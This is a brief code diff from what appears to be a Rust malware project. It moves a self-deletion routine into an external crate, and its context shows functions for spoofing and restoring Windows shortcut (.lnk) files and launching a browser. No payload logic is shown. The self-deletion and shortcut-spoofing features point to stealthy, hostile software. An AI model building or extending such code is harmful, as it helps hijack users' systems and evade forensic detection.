@@ -8,8 +8,7 @@ use shortcut::{spoof_lnk, restore_lnk};
 mod browser;
 use browser::start_browser;
 
-mod self_delete;
-use self_delete::delete_self;
+use selfdeletion;
 
 #[async_std::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
@@ -48,7 +47,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
         #[cfg(feature = "debug")]
         println!("[*] Deleting self...");
-        let _ = delete_self();
+        let _ = selfdeletion::delete_self();
 
         #[cfg(feature = "debug")] {
             println!("[?] Press Enter to exit...");
